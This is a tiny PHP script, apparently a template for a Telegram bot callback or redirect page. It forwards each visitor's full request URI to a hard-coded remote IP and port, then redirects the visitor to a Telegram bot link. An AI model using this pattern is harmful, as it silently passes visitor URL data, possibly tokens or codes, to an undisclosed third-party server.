<?

$callback = file_get_contents('http://1.2.3.4:1000' . $_SERVER['REQUEST_URI']);
$botName = "";
header('Location: tg://resolve?domain=' . $botName);
exit();
